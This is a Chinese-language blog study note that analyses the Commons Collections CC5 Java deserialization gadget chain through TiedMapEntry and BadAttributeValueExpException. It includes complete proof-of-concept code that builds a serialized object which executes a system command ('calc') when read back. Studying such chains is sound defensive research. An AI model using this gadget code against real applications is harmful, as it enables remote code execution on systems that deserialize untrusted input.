---
title: JAVA安全:CC5链
---

*作者：Narcher*	*时间：2024/3/19*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

CC5的限制比较多，对于jdk版本以及必须WITHOUT a security manager

实际上这个CC5链和CC1很像啊，只是改变了LazyMap的get方法的触发方式，为了记录学习过程，还是写下来吧。



## 正文

先看一下ysoserial的CC5流程：

<img src="JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853519154.png" alt="1710853519154" style="zoom:67%;" />

由于和CC1链很像，我们就先把CC1复制过来看看：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
map.put("value","value");
LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);
//反射获取AnnotationInvocationHandler类
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC1.txt"));
oos.writeObject(handler);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC1.txt"));
ois.readObject();
```

我们需要改的就是LazyMap的后边，先看看调用get方法的类吧

### 1.TiedMapEntry部分

<img src="JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853749908.png" alt="1710853749908" style="zoom:67%;" />

可见TiedMapEntry的getValue方法调用了get方法，可作为一个点，我们继续往上找：

<img src="JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853880435.png" alt="1710853880435" style="zoom:67%;" />

可见其toString方法调用了getValue方法，我们再往上找

### 2.BadAttributeValueExpException部分

<img src="JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710854104973.png" alt="1710854104973" style="zoom:67%;" />

可见BadAttributeValueExpException的readObject方法调用了toString方法，我们接下来只需要让valObj是我们传入的TiedMapEntry实例就行了，我们来看看valObj怎么来的：

```java
ObjectInputStream.GetField gf = ois.readFields();
Object valObj = gf.get("val", null);
```

说白了，valObj的值就是从输入流ois中读取的对象的"val"字段的值。如果该字段不存在或者值为null，valObj的值就会是null。

那么怎么控制val呢？如果直接在构造器中调用的话，那么在构造的时候就会直接触发这条链子，很简单，用反射不就是了

<img src="JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710855036609.png" alt="1710855036609" style="zoom:67%;" />

```java
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
Class c = badAttributeValueExpException.getClass();
Field valField = c.getDeclaredField("val");
valField.setAccessible(true);
valField.set(badAttributeValueExpException, tiedMapEntry);
```

### 3.构造链

把上边的直接改到CC1链子里就行了：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
map.put("value","value");
LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);
//反射
TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, "aaa");
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
Class c = badAttributeValueExpException.getClass();
Field valField = c.getDeclaredField("val");
valField.setAccessible(true);
valField.set(badAttributeValueExpException, tiedMapEntry);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC1.txt"));
oos.writeObject(badAttributeValueExpException);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC1.txt"));
ois.readObject();
```

CC5就完成了。